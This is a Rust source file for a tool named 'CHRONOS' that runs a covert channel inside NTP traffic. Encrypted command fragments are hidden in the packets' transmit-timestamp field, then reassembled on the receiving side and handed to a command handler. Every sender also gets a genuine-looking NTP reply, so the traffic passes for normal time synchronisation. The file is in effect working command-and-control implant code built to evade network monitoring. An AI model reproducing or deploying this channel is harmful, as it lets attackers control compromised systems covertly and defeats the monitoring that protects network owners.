use std::net::UdpSocket;
use std::time::{SystemTime, UNIX_EPOCH};
use std::convert::TryInto;
use std::collections::HashMap;
use std::thread;

use crate::crypto;
use crate::commands;

const NTP_PACKET_SIZE: usize = 48;
const MAX_PAYLOAD_PER_PACKET: usize = 6;

struct MessageAssembler {
    fragments: HashMap<u8, Vec<u8>>,
    total: Option<u8>,
}

pub fn run_receiver(listen: &str, key: &[u8; 32]) {
    let socket = UdpSocket::bind(listen).expect("Failed to bind NTP listener");
    println!("[CHRONOS] Receiver listening on {listen}"); 
    println!("[CHRONOS] Multi-packet stealth mode active...");

    let mut buf = [0u8; 1024];
    let mut assemblers: HashMap<u8, MessageAssembler> = HashMap::new();

    loop {
        if let Ok((size, addr)) = socket.recv_from(&mut buf) {
            if size < NTP_PACKET_SIZE { continue; }

            let packet = &mut buf[..NTP_PACKET_SIZE];
            let ts_bytes: &[u8; 8] = (&packet[40..48]).try_into().unwrap();

            if ts_bytes.iter().all(|&b| b == 0) {
                reply_standard_ntp(&socket, addr);
                continue;
            }

            if let Some(payload) = crypto::decrypt_from_ntp(ts_bytes, key) {
                if payload.len() >= 2 {
                    let msg_id = payload[0];
                    let seq = payload[1];
                    let data = &payload[2..];

                    let hex_payload = hex::encode(data);
                    let text_payload = to_readable_text(data);

                    println!("[{}] msg_id={} seq={} len={} | hex={} | text={}", 
                        addr, msg_id, seq, data.len(), hex_payload, text_payload);

                    let assembler = assemblers
                        .entry(msg_id)
                        .or_insert_with(|| MessageAssembler {
                            fragments: HashMap::new(),
                            total: None,
                        });

                    assembler.fragments.insert(seq, data.to_vec());

                    if assembler.total.is_none() {
                        if data.len() < MAX_PAYLOAD_PER_PACKET {
                            assembler.total = Some(seq + 1);
                        } else if seq == 0 {
                            assembler.total = Some(1);
                        }
                    }

                    if let Some(total) = assembler.total {
                        if assembler.fragments.len() == total as usize {
                            if let Some(full) = reassemble(assembler) {
                                commands::handle(&full, addr);
                                assemblers.remove(&msg_id);
                            }
                        }
                    }
                }
            }

            reply_standard_ntp(&socket, addr);
        }
    }
}

fn to_readable_text(data: &[u8]) -> String {
    
    let is_text = data.iter().all(|&b| (32..=126).contains(&b) || b == 0);

    if is_text {
        let text = String::from_utf8_lossy(data)
            .trim_end_matches('\0')
            .to_string();
        
        if text.is_empty() {
            "(empty)".to_string()
        } else {
            format!("\"{text}\"")
        }
    } else {
        "<binary>".to_string()
    }
}

fn reassemble(asm: &MessageAssembler) -> Option<Vec<u8>> {
    let total = asm.total?;
    let mut full = Vec::new();
    for i in 0..total {
        if let Some(chunk) = asm.fragments.get(&i) {
            full.extend_from_slice(chunk);
        } else {
            return None;
        }
    }
    Some(full)
}

pub fn send_command(target: &str, command: &[u8], key: &[u8; 32]) {
    if command.is_empty() { return; }

    let socket = UdpSocket::bind("0.0.0.0:0").expect("Bind failed");
    socket.connect(target).expect("Connect failed");

    let msg_id = rand::random::<u8>();
    let chunks: Vec<&[u8]> = command.chunks(MAX_PAYLOAD_PER_PACKET).collect();

    println!("[CHRONOS] Sending {} byte message in {} fragment(s)...", command.len(), chunks.len());

    for (seq, chunk) in chunks.iter().enumerate() {
        let mut frame = vec![msg_id, seq as u8];
        frame.extend_from_slice(chunk);

        let hidden = crypto::encrypt_for_ntp(&frame, key);

        let mut packet = [0u8; NTP_PACKET_SIZE];
        packet[0] = 0b00_100_011;
        packet[1] = 3;

        let now = get_current_timestamp();
        packet[24..32].copy_from_slice(&now);
        packet[40..48].copy_from_slice(&hidden);

        let _ = socket.send(&packet);
        println!("  [+] Fragment {}/{} ({} bytes)", seq + 1, chunks.len(), chunk.len());

        thread::sleep(std::time::Duration::from_millis(90));
    }

    println!("[CHRONOS] Message sent");
}

fn get_current_timestamp() -> [u8; 8] {
    let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap();
    let seconds = now.as_secs();
    let fraction = ((now.subsec_nanos() as u64) << 32) / 1_000_000_000;
    let ts = (seconds << 32) | fraction;
    ts.to_be_bytes()
}

fn reply_standard_ntp(socket: &UdpSocket, addr: std::net::SocketAddr) {
    let mut response = [0u8; NTP_PACKET_SIZE];
    response[0] = 0b00_100_011;
    response[1] = 2;
    response[2] = 6;
    response[3] = 0xEC;

    let now = get_current_timestamp();
    response[16..24].copy_from_slice(&now);
    response[24..32].copy_from_slice(&now);
    response[32..40].copy_from_slice(&now);
    response[40..48].copy_from_slice(&now);

    let _ = socket.send_to(&response, addr);
}
